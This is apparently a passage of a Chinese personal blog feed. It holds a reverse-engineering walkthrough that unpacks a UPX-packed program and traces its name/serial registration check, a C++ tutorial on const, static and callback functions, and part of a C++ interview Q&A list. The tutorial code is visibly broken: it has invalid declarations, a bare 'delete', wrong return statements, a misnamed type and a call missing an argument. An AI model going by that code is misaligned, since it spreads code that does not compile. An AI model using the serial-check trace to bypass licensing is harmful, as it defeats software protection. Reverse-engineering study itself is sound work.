class="hljs-type">char</span>*)&amp;__dword_4020F9, <span class="hljs-number">4</span>, &amp;ReturnLength, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (FileHandle != INVALID_HANDLE_VALUE)<br>&#123;<br><span class="hljs-built_in">CloseHandle</span>(FileHandle);<br>FileHandle = INVALID_HANDLE_VALUE;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>逆向样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提权</tag>
      
      <tag>逆向</tag>
      
      <tag>IDA Pro</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Malware32</title>
    <link href="/project/2022/12/26/Malware32/"/>
    <url>/project/2022/12/26/Malware32/</url>
    
    <content type="html"><![CDATA[<p>一个UPX加壳的加密样本的逆向分析</p><span id="more"></span><p>虚拟机-&gt;操作系统：Windows10 Pro<br>1、使用PEID观察是否有壳 -&gt; 有壳 UPX1 </p><p>2、使用IDA32进行调试时UPX压缩 采用两种方法：1.在pusha执行后的esp中地址处下硬件断点 f9调试 此时到达可跳转进主函数入口处 2.寻找pusha对应的popa 下方最近的jmp一般为主函数入口</p><p>3、使用UPX软件进行脱壳操作 命令行指令 upx -d +文件地址\文件名.后缀名</p><p>4、使用IDA32进行逆向分析</p><p>5、 Reg.dat</p><p>6、jbe     short loc_404CA3    jbe指令 如果小于等于则跳转 如果此时的CF标志位或者ZF标志位为1,跳转,其他不跳转 相当于小于等于命令</p><p>7、使用CreatefileA打开文件  Reg.dat 若打开文件失败则调用失败指令 所以要创建一个Reg.dat文件 来使得文件可以打开</p><p>8、通过字符串寻找到OK Button 和 Cancel Button 最终定位到register窗口刷新函数入口 00437D1C</p><p>9、在register入口下断点 几次刷新后 窗口生成</p><p>10、在输入Name后 发现窗口没有反应</p><p>11、更改第一个serial后 程序被入口停住 f8开始向下调试</p><p>12、程序在地址00437D35： jz      short loc_437D45跳转 怀疑是跳转到获取数据函数</p><p>13、00437D58： 8B 45 FC                      mov     eax, [ebp+var_4] 将输入的值传入eax寄存器中</p><p>14、执行函数 00437D5B： E8 D0 EB FC FF       call    sub_406930</p><p>15、执行完函数后 返回输入的第一个序列号</p><p>16、00437D60 :89 04 9D 38 A7 43 00          mov     ds:dword_43A738[ebx*4], eax 将输入的值存入全局变量中</p><p>17、00437D67: EB 6A                         jmp     short loc_437DD3 跳转到另一个函数地址 继续跟踪</p><p>18、00437DD3: E8 00 FE FF FF                call    sub_437BD8 执行该函数 步入函数中查看</p><p>19、00437C02: 8B 45 FC                      mov     eax, [ebp+var_4] 将名称Name传入寄存器eax中</p><p>20、00437C05: E8 6E BD FC FF                call    sub_403978 函数返回了Name字符串的长度</p><p>21、00437C0A: 83 F8 05                      cmp     eax, 5   将字符串长度与5相比 有五个及以上继续执行 否则跳转到退出函数处</p><p>22、00437C16: 0F B6 00                      movzx   eax, byte ptr [eax]    从字符串中取出第一个字符</p><p>23、00437C19: B9 0A 00 00 00                mov     ecx, 0Ah 将10移入寄存器ecx中</p><p>24、00437C1E: 99                            cdq              扩充寄存器 为除法做准备</p><p>25、00437C1F: F7 F9                         idiv    ecx      0x41h / 0Ah 将字符的ASCII码除以10</p><p>26、00437C21: A3 2C A7 43 00                mov     ds:dword_43A72C, eax  计算结果为6</p><p>27、00437C29: 0F B6 40 02                   movzx   eax, byte ptr [eax+2] 第二次取出的是第三个字符</p><p>28、除了第二次取出的字符跳了一位外 其他除以的操作相同</p><p>29、00437C6C: 8D 55 F8                      lea     edx, [ebp+var_8]<br>   00437C6F: 8B 03                         mov     eax, [ebx]<br>   00437C71: E8 8A EC FC FF                call    sub_406900<br>   00437C76: 8B 45 F8                      mov     eax, [ebp+var_8]<br>   00437C79: E8 FA BC FC FF                call    sub_403978      获取字符串长度<br>   00437C7E: 48                            dec     eax       字符串长度不为1还需要继续向下执行 当为1时跳转，因为1– = 0 标志位ZF置为0<br>   00437C7F: 74 0C                         jz      short loc_437C8D  这里如果eax–不为0，会继续执行 将字符串长度调整为1<br>   00437CA5: 8B 0A                         mov     ecx, [edx]<br>   00437CA7: 3B 08                         cmp     ecx, [eax]  将输入的serial和程序计算得到serial比较<br>   00437CA9: 74 07                         jz      short loc_437CB2</p>]]></content>
    
    
    <categories>
      
      <category>逆向样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
      <tag>IDA Pro</tag>
      
      <tag>UPX1壳</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>回调函数</title>
    <link href="/project/2022/12/26/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/"/>
    <url>/project/2022/12/26/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="特殊函数-const-static-callback"><a href="#特殊函数-const-static-callback" class="headerlink" title="特殊函数(const static callback)"></a>特殊函数(const static callback)</h3><span id="more"></span><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*************************************************************/</span><br><span class="hljs-comment">//const 函数</span><br><span class="hljs-comment">/*为了给常对象使用的成员函数</span><br><span class="hljs-comment">常对象实际上是只能对类中的常成员进行访问,为了防止常对象通过调用普通的成员函数对成员变量修改，才制定常函数*/</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CMyClass1</span>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">CMyClass1</span>()<br>&#123;<br><br>&#125;<br>~<span class="hljs-built_in">CMyClass1</span>()<br>&#123;<br><br>&#125;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Sub_1</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span><br><span class="hljs-function">    </span>&#123;<br>        <br>    &#125;<br>     <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Sub_2</span><span class="hljs-params">()</span> </span><br><span class="hljs-function">    </span>&#123;<br>        m_1=<span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">Sub_3</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <br>    &#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> m_1;<br><br>&#125;<br><span class="hljs-comment">/*************************************************************/</span><br><span class="hljs-comment">//static 函数(如果要访问类中的非静态成员必须要进行类对象指针传参)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  1)静态成员函数是为了访问私有静态成员变量，不允许使用类对象进行访问</span><br><span class="hljs-comment">  2)静态变量是为了解决对象间的数据共享和通信</span><br><span class="hljs-comment">  若构造函数是私有的 ，普通成员对象难以定义</span><br><span class="hljs-comment">  1.构造函数没有返回值</span><br><span class="hljs-comment">  2.类名字与函数名字一致</span><br><span class="hljs-comment">  3.构造函数可以为私有</span><br><span class="hljs-comment">  构造函数私有属性利用静态成员进行对象申请</span><br><span class="hljs-comment">  3)callback通常使用静态成员函数作为接口实现</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CMyClass2</span>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">CMyClass2</span>()<br>&#123;<br> _tprintf(_T(<span class="hljs-string">&quot;%d\r\n&quot;</span>));<br>    &#125;<br>~<span class="hljs-built_in">CMyClass2</span>()<br>&#123;<br><br>&#125;<br>    <span class="hljs-type">static</span> <span class="hljs-type">void</span> _Sub_1()<br>    &#123;<br>        _m_1=<span class="hljs-number">10</span>;<br>        _tprintf(_T(<span class="hljs-string">&quot;%d\r\n&quot;</span>),_m_1);<br>    &#125;<br>      <span class="hljs-type">static</span> CMyClass2*MyClass2 _Sub_2() <span class="hljs-comment">//构造函数为私有</span><br>    &#123;<br>       CMyClass2* MyClass2=<span class="hljs-keyword">new</span> CMyClass2;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><span class="hljs-keyword">private</span>:<br>   <span class="hljs-type">static</span> <span class="hljs-type">int</span> _m_1;  <span class="hljs-comment">//是为了解决类之间的数据共享 具有读写属性</span><br>    <span class="hljs-type">int</span> m_2;<br><br>&#125;<br><br><span class="hljs-type">int</span> CMyClass1::_m_1=<span class="hljs-number">0</span>;  <span class="hljs-comment">//静态成员要进行初始化</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Sub_2</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-type">int</span> _tmain()<br>&#123;<br><span class="hljs-type">const</span> CMyClass1 Object;<br>    <span class="hljs-type">int</span> v1=Object.m_1;<br>    Object.m_1=<span class="hljs-number">10</span>; <span class="hljs-comment">//error</span><br>    Object.<span class="hljs-built_in">Sub_2</span>(); <span class="hljs-comment">//error</span><br>    Object.<span class="hljs-built_in">Sub_1</span>();<span class="hljs-comment">//Right</span><br>    <br>    <span class="hljs-built_in">Sub_2</span>();<br>  LPFN_SUB_3 f1;<br>   <span class="hljs-built_in">f1</span>(<span class="hljs-number">10</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Sub_2</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>   CMyClass2::<span class="hljs-built_in">Sub_1</span>(); <span class="hljs-comment">//前提静态成员变量为私有的</span><br>  <span class="hljs-comment">// CMyClass2 Object;</span><br>    CMyclass2 ::_m_1; <span class="hljs-comment">//若为公有可以直接作用域访问</span><br>    <br>    CMyClass2*Object=CMyClass2::_Sub_2();<br>    <span class="hljs-keyword">delete</span> <br>   <br>&#125;<br><br><span class="hljs-comment">/*************************************************************/</span><br><span class="hljs-comment">//callback 函数  (回调函数) </span><br><br><span class="hljs-comment">//函数指针</span><br><span class="hljs-comment">//静态成员函数作为回调函数使用</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CMyClass3</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">CMyClass3</span>()   <br>&#123;<br>m_2 = <span class="hljs-number">911</span>;<br>&#125;<br><span class="hljs-keyword">public</span>:<br>~<span class="hljs-built_in">CMyClass3</span>()<br>&#123;<br>&#125;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> _Callback(CMyClass3* MyClass3)    <span class="hljs-comment">//如果回调被设计为静态成员函数 静态成员函数是不能访问类中的成员函数与成员变量</span><br>&#123;<br>_tprintf(_T(<span class="hljs-string">&quot;_Callback()\r\n&quot;</span>));<br>MyClass3-&gt;<span class="hljs-built_in">InsertData</span>();<span class="hljs-comment">//如果要访问类中的非静态成员必须要进行类对象指针传参</span><br><span class="hljs-keyword">return</span> MyClass3-&gt;m_2;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Callback</span><span class="hljs-params">()</span>        <span class="hljs-comment">//如果回调被设计为普通成员函数</span></span><br><span class="hljs-function"></span>&#123;<br>_tprintf(_T(<span class="hljs-string">&quot;Callback()\r\n&quot;</span>));<br><span class="hljs-built_in">InsertData</span>();<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InsertData</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>_tprintf(_T(<span class="hljs-string">&quot;InsertData()\r\n&quot;</span>));<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DeleteData</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br>&#125;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> _m_1;       <br><span class="hljs-type">int</span> m_2;<br><br><br>&#125;;<br><br> <span class="hljs-comment">//窗口</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CMyClass4</span>   <br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">CMyClass4</span>()<br>&#123;<br><br>&#125;<br><span class="hljs-keyword">public</span>:<br>~<span class="hljs-built_in">CMyClass4</span>()<br>&#123;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Sub_1</span><span class="hljs-params">(<span class="hljs-type">int</span> (*_Callback)(CMyClass3* MyClass3), CMyClass3* MyClass3)</span></span><br><span class="hljs-function"></span>&#123;<br>_tprintf(_T(<span class="hljs-string">&quot;%d\r\n&quot;</span>), _Callback(MyClass3));<br><span class="hljs-comment">//通过静态成员函数访问它所属类的成员变量</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Sub_2</span><span class="hljs-params">(<span class="hljs-type">void</span> (CMyClass3::*Callback)(), CMyClass3* MyClass3)</span></span><br><span class="hljs-function"></span>&#123;<br>MyClass3-&gt;<span class="hljs-built_in">Callback</span>();<br>&#125;<br><span class="hljs-keyword">private</span>:<br><br>&#125;;<br><br><span class="hljs-comment">//函数申明</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span> <span class="hljs-params">(*LPFN_SUB_3)</span><span class="hljs-params">(<span class="hljs-type">int</span> ParameterData)</span></span>; <span class="hljs-comment">//定义一个数据类型</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Sub_3</span><span class="hljs-params">(<span class="hljs-type">int</span> ParameterData2)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Sub_4</span><span class="hljs-params">(LPSN_SUB_3 ParammeterData1,<span class="hljs-type">int</span> ParameterData2)</span></span>;<br><br><span class="hljs-comment">//主函数入口</span><br><span class="hljs-type">int</span> _tmain()<br>&#123;<br>  LPFN_SUB_3 f1=Sub_3;<span class="hljs-comment">//通过某种方法获得了Sub_3</span><br>   <span class="hljs-built_in">Sub_4</span>(f1);<br>   <span class="hljs-built_in">Sub_5</span>();<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//函数名本质上就是指针 函数指针</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Sub_3</span><span class="hljs-params">(<span class="hljs-type">int</span> ParameterData)</span>  </span><br><span class="hljs-function"></span>&#123;<br>    _tprintf(_T(<span class="hljs-string">&quot;Sub_3()\r\n&quot;</span>));<br>  <span class="hljs-comment">//如何定义一个函数指针(函数的返回值、函数的参数列表、函数的调用约定)    </span><br>&#125;<br><br> <span class="hljs-comment">//Sub_3中的参数也必须放入Sub_4中   </span><br> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Sub_4</span><span class="hljs-params">(LPSN_SUB_3 ParammeterData1,<span class="hljs-type">int</span> ParameterData2)</span></span><br><span class="hljs-function"> </span>&#123;<br>     <span class="hljs-built_in">ParameterData1</span>(ParameterData2);<br> &#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Sub_5</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    CMyClass3 Object3;<br>    CMyClass4 Object4;<br>    Object4.<span class="hljs-built_in">Sub_1</span>(CMyClass3::_Callback,&amp;Object3);<br>    Object4.<span class="hljs-built_in">Sub_2</span>(&amp;CMyClass3::<span class="hljs-built_in">Callback</span>(),&amp;Object3);  <span class="hljs-comment">//记住就行</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>小结：静态成员出现必须在初始化列表中初始化</p><p>静态成员函数的作用：</p><p>1.访问静态成员</p><p>2.实现类之间数据的共享</p><p>3.作为callback的接口，但必须传入对象指针访问成员变量</p>]]></content>
    
    
    
    <tags>
      
      <tag>C++</tag>
      
      <tag>回调函数</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++面试常见问题之美（转载）</title>
    <link href="/project/2022/09/26/C-%E9%9D%A2%E8%AF%95%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E4%B9%8B%E7%BE%8E/"/>
    <url>/project/2022/09/26/C-%E9%9D%A2%E8%AF%95%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E4%B9%8B%E7%BE%8E/</url>
    
    <content type="html"><![CDATA[<p>包含一些常见的C++面试题 个人用于复习使用</p><span id="more"></span><p>目录</p><p>问答题<br>        1. 比较值传递和引用传递的相同点和不同点。<br>        2 什么叫内联函数?它有哪些特点？<br>        3 什么叫复制构造函数？复制构造函数何时被调用？<br>        4 复制构造函数与赋值运算符（=）有何不同？<br>        5 什么叫作用域？有哪几种类型的作用域？<br>        6 什么叫做可见性？可见性的一般规则是什么？<br>        7 什么叫静态数据成员？他有何特点？<br>        8 什么叫静态函数成员？他有何特点？<br>        9 什么叫友元函数？什么叫友元类？<br>        10 在函数内部定义的普通局部变量和静态局部变量在功能上有何不同？计算机底层对这两类变量做了怎样的不同处理导致了这种差异？<br>        11 引用和指针有何区别？何时只能使用指针而不能使用引用？<br>        12 比较类的 3 种继承方式之间的差别？<br>        13 什么叫虚基类？有何作用？<br>        14 组合与继承有什么共同点和差异？通过组合生成的类与被组合的类之间的逻辑关系是什 么？继承呢？<br>        15 基类与派生类的对象，指针或引用之间，哪些情况下可以隐含转换，哪些情况下可以显 示转换？在涉及多重继承或虚继承的情况下，在转换时会面临哪些新问题？<br>        16 什么叫做多态性？在 C++种是如何实现多态的？<br>        17 什么叫抽象类？抽象类有何作用？抽象类的派生类是否一定要给出纯虚函数的实现？<br>        18 在 C++中，能否声明虚构造函数？为什么？能否声明虚析构函数？有何用途？<br>        19 什么叫做流？流的提取和插入是指什么？I/O 流在 C++中起着怎样的作用？<br>        20 什么叫做异常？什么叫做异常处理？<br>        21 C++的异常处理机制有何优点？<br>        22 比较函数重载和虚函数在概念和使用方式方面有什么区别？<br>        23 比较 class 和 struct 结构体的异同<br>        24 浅拷贝和深拷贝的区别？<br>        25 const 和 static 作用 const 作用：<br>        26 析构函数带 virtual 和 不带 virtual 的区别<br>        27 重写，重载和隐藏的区别？<br>        28 C++中的四个默认的函数<br>        29 不可以被重载的运算符–五个<br>        30 三种字符数组初始化的方法<br>        31 哪些操作符必须重载为成员函数<br>        32 什么是“else 摇摆问题”，举例说明<br>        33 函数模板和函数重载的区别与联系<br>        34 怎样区别虚函数和纯虚函数？两者都有什么作用<br>        35 面向对象程序“接口与实现方法分离”，有什么作用（好处）<br>        36 列出所有与字符串处理有关的头文件<br>        37 C++中显示类型转换<br>        38 delete 和 delete [] 的区别？<br>        39 存储类别说明符可划分为两类。<br>        40 什么是运算符重载，它如何增强 C++的扩展性？<br>        41 为什么说”继承是 C++面向对象的主要特征之一”?请简要说明.？<br>        42 作用域辨析有哪些？<br>        43.STL 是什么？组成部分和区别。<br>        44 如何声明和使用虚函数。说明它在多态性中的作用和意义。<br>        44.什么是逻辑错误？什么是语法错误？请举例说明。<br>        45 编写语句说明枚举类型是如何定义和使用的。<br>        46 ADT是什么？简述你对“数据抽象”和“信息隐藏”的认识。<br>        47 简述你对“面向对象”和“面向过程”编程思想的理解和认识。<br>        50 写出递归函数定义以及相应的优缺点<br>        51 写出包含输入输出的标准库<br>        52 怎样区别虚函数和纯虚函数？两者都有什么作用</p><h3 id="问答题"><a href="#问答题" class="headerlink" title="问答题"></a>问答题</h3><ol><li>比较值传递和引用传递的相同点和不同点。<br>值传递是指当发生函数调用时，给形参分配内存空间，并用实参来初始化形参（直接将 实参的值传递给形参）。这一过程是参数值的单向传递过程，一旦形参获得了值便与实参脱 离关系，此后无论形参发生了怎样的改变，都不会影响到实参。<br>引用传递将引用作为形参，在执行主调函数中的调用语句时，系统自动用实参来初始化 形参。这样形参就成为实参的一个别名，对形参的任何操作也就直接作用于实参。</li></ol><p>2 什么叫内联函数?它有哪些特点？<br>定义时使用关键字 inline 的函数叫做内联函数；编译器在编译时在调用处用函数体进行替换,节省了参数传递、控制转移等开销；<br>内联函数体内不能有循环语句和 switch 语句；<br>内联函数的定义必须出现在内联函数第一次被调用之前；对内联函数不能进行异常接口声明；</p><p>3 什么叫复制构造函数？复制构造函数何时被调用？<br>复制构造函数是一种特殊的构造函数，具有一般构造函数的所有特性，其形参是本类的 对象的引用 (const T &amp;)。其作用是使用一个已经存在的对象（由复制构造函数的参数指定），去初始化同类的一个新对象。<br>（1） 当用类的一个对象去初始化该类的另一个对象时；<br>（2） 如果函数的形参是类的对象，调用函数时进行形参和实参结合时；<br>（3） 如果函数的返回值是类的对象，函数执行完成返回调用者时。</p><p>4 复制构造函数与赋值运算符（=）有何不同？<br>从概念上区分：复制构造函数是构造函数，而赋值操作符属于操作符重载范畴，它通常 是类的成员函数 从原型上来区分：<br>复制构造函数原型 ClassType(const ClassType &amp;);无返回值；<br>赋值操作符原型 ClassType&amp; operator=(const ClassType &amp;);返回值为 ClassType 的引用，便于连续赋 值操作 从使用的场合来区分：复制构造函数用于产生对象，它用于以下几个地方：函数参数为 类的值类型时、函数返回值为类类型时以及初始化语句</p><p>5 什么叫作用域？有哪几种类型的作用域？<br>作用域讨论的是标识符的有效范围，作用域是一个标识符在程序正文中有效的区域。 C++的作用域分为：函数原型作用域、函数作用域、文件作用域(全局作用域)、块作用 域（局部作用域）、类作用域和名字空间作用域。</p><p>6 什么叫做可见性？可见性的一般规则是什么？<br>可见性是标识符是否可以引用的问题； 可见性的一般规则是：标识符要声明在前，引用在后，在同一作用域中，不能声明同名 的标识符。对于在不同的作用域声明的标识符，遵循的原则是：若有两个或多个具有包含关 系的作用域，外层声明的标识符如果在内层没有声明同名标识符时仍可见，如果内层声明了 同名标识符则外层标识符不可见。</p><p>7 什么叫静态数据成员？他有何特点？<br>类的静态数据成员是类的数据成员的一种特例，采用 static 关键字来声明。对于类的普<br>通数据成员，每一个类的对象都拥有一个拷贝，就是说每一个对象的同名数据成员可以分别存储不同的值，这也是保证对象拥有区别于其他对象的特征的需要，但是静态数据成员，每 个类只要一个拷贝，由所有该类的对象共同维护和使用，这个共同维护，使用也就实现了同一类的不同对象之间的数据共享。</p><p>8 什么叫静态函数成员？他有何特点？<br>使用 static 关键字声明的函数成员是静态的，静态函数成员属于整个类，被同一个类的 所有对象共同维护，为这些所有对象共享。<br>静态成员函数具有以下两个方面的好处：<br>一是由于静态成员函数只能直接访问同一个类的静态数据成员，可以保证不会对该类的其余数据成员造成负面影响；<br>二是同一个类只维护一个静态函数成员的拷贝，节约了系统的开销，提高 程序的运行效率。</p><p>9 什么叫友元函数？什么叫友元类？<br>友元函数是使用关键字 friend 关键字声明的函数，它可以访问相应类的保护成员和私 有成员。友元类是使用 friend 关键字声明的类，它的所有成员函数都是相应类的友元函数。<br>友元不可继承，没有传递性。</p><p>10 在函数内部定义的普通局部变量和静态局部变量在功能上有何不同？计算机底层对这两类变量做了怎样的不同处理导致了这种差异？<br>局部作用域中静态变量的特点是：它并不会随着每次函数调用而产生一个副本，也不会 随着函数的返回而失效，定义时未指定初值的基本类型静态变量，会被以 0 值初始化；局部作用域的全部变量诞生于声明点，结束于声明所在的块执行完毕之时，并且不指定初值，意 味初值不确定。普通局部变量存放于栈区，超出作用域后，变量被撤销，其所占的内存也被 回收；静态局部变量存放于静态数据存储区，全局可见，但是作用域是局部作用域，超出作用域后变量仍然存在。</p><p>11 引用和指针有何区别？何时只能使用指针而不能使用引用？<br>引用是一个别名，不能为 NULL 值，不能被重新分配；<br>指针是一个存放地址的变量。<br>当需要对变量重新赋以另外的地址或赋值为 NULL 时只能使用指针。<br>引用是一个变量的别名，本身不单独分配自己的内存空间，而指针有自己的内存空间。</p><p>12 比较类的 3 种继承方式之间的差别？<br>公有继承，使得基类 public(公有)和 protected(保护)成员的访问属性在派生类中不变， 而基类 private(私有)成员不可访问。<br>私有继承，使得基类 public(公有)和 protected(保护)成员都以 private(私有)成员身份出 现在派生类中，而基类 private(私有)成员不可访问。<br>保护继承中，基类 public(公有)和 protected(保护)成员都以 protected(保护)成员身份出 现在派生类中，而基类 private(私有)成员不可访问。</p><p>13 什么叫虚基类？有何作用？<br>当某类的部分或全部直接基类是从另一个基类派生而来，这些直接基类中，从上一级基类继承来的成员就拥有相同的名称，派生类的对象的这些同名成员在内存中同时拥有多 个拷贝，我们可以使用作用域分辨符来唯一标识并分别访问它们。<br>我们也可以将直接基类的共同基类设置为虚基类，这时从不同的路径继承过来的该类成员在内存中只拥有一个拷 贝，这样就解决了同名成员的唯一标识问题。<br>虚基类的声明是在派生类的定义过程，其语法格式为： class 派生类名：virtual 继承方式 基类名 上述语句声明基类为派生类的虚基类，在多继承情况下，虚基类关键字的作用范围和 继承方式关键字相同，只对紧跟其后的基类起作用。<br>声明了虚基类之后，虚基类的成员在 进一步派生过程中，和派生类一起维护一个内存数据拷贝。 虚基类就是为了解决多继承产生的二义性问题</p><p>14 组合与继承有什么共同点和差异？通过组合生成的类与被组合的类之间的逻辑关系是什 么？继承呢？<br>组合和继承它们都使得已有对象成为新对象的一部分，从而达到代码复用的目的。组合 和继承其实反映了两种不同的对象关系。<br>组合反映的是“有一个”（has-s）的关系，如果类 B 中存在一个类 A 的内嵌对象，表示的 是每一个 B 类型的对象都“有一个”A 类型的对象，A 类型的对象与 B 类型的对象是部分整体 的关系。<br>继承反映的是“是一个”（is-a）的关系，在“是一个”关系中，如果类 A 是类 B 的公有基 类，那么这表示每一个 B 类型的对象都“是一个”A 类型的对象，B 类型的对象与 A 类型的对 象是特殊与一般的关系。</p><p>15 